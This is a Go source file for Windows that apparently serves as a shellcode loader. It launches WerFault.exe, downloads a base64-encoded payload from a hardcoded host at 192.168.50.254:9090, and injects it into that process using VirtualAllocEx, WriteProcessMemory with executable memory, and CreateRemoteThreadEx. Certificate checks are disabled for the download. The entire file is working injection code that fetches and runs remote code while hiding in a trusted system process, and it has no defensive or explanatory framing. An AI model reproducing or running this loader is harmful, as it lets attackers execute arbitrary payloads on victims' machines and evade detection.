```
package main

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"net/http"
	"syscall"
	"unsafe"
)

var (
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	ntdll    = windows.NewLazyDLL("ntdll.dll")

	OpenProcess = kernel32.NewProc("OpenProcess")

	VirtualAllocEx       = kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx     = kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory   = kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx = kernel32.NewProc("CreateRemoteThreadEx")
	WaitForSingleObject  = kernel32.NewProc("WaitForSingleObject")

	RtlCreateProcessParameters = ntdll.NewProc("RtlCreateProcessParameters")
	RtlCreateUserProcess       = ntdll.NewProc("RtlCreateUserProcess")

	RtlMoveMemory = kernel32.NewProc("RtlMoveMemory")

	// Process32FirstW Process32NextW  for pid
	CloseHandle = kernel32.NewProc("CloseHandle")
	//CreateToolhelp32Snapshot = kernel32.NewProc("CreateToolhelp32Snapshot")
	//Process32FirstW          = kernel32.NewProc("Process32FirstW")
	//Process32NextW           = kernel32.NewProc("Process32NextW")
)

const PAGE_READWRITE = 0x04

func getpid(processName string) int32 {
	processes, _ := ps.Processes()
	for _, process := range processes {
		if process.Executable() == processName {
			return int32(process.Pid())
		}
	}
	return 0
}

func openwer() *syscall.ProcessInformation {
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	const ProcessName = `C:\Windows\System32\WerFault.exe`
	err := syscall.CreateProcess(nil, syscall.StringToUTF16Ptr(ProcessName), nil, nil, false, 0, nil, nil, &si, &pi)
	if err != nil {
		panic(err)
	}
	return &pi
	//_, _, err = WaitForSingleObject.Call(uintptr(pi.Thread), uintptr(0xFFFFFFFF))

}

func downsc() string {
	url := "http://192.168.50.254:9090/ccl.dea"
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	resp, _ := client.Get(url)

	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	return string(body)
}

func dosc() {
	const ProcessName = "WerFault.exe"
	sc, _ := base64.StdEncoding.DecodeString(downsc())
	targetProcess, _, _ := OpenProcess.Call(0x0002|0x0008|0x0020|0x0010|0x0400, 0, uintptr(getpid(ProcessName)))
	fmt.Println(targetProcess)
	oldProtect := PAGE_READWRITE
	remoteProcessBuffer, _, _ := VirtualAllocEx.Call(targetProcess, 0, uintptr(len(sc)), 0x3000, 0x40)
	VirtualProtectEx.Call(remoteProcessBuffer, uintptr(len(sc)), 0x40, uintptr(unsafe.Pointer(&oldProtect)))
	_, _, err := WriteProcessMemory.Call(targetProcess, remoteProcessBuffer, (uintptr)(unsafe.Pointer(&sc[0])), uintptr(len(sc)), 0)
	if err != nil {
		fmt.Println("threadErr:", err)
	}
	_, _, err = CreateRemoteThreadEx.Call(targetProcess, 0, 0, remoteProcessBuffer, 0, 0, 0)
	if err != nil {
		fmt.Println("threadErr:", err)
	}

}
func main() {
	pi := openwer()
	defer syscall.CloseHandle(pi.Process)
	dosc()
	_, err := syscall.WaitForSingleObject(pi.Process, syscall.INFINITE)
	if err != nil {
		panic(err)
	}
	select {}
	//dir, err := os.Getwd()
	//if err != nil {
	//	panic(err)
	//}
	//cmd := exec.Command("./play.exe")
	//cmd.Dir = dir
	//
	//if err := cmd.Start(); err != nil {
	//	panic(err)
	//}
	//go dosc()

}

```
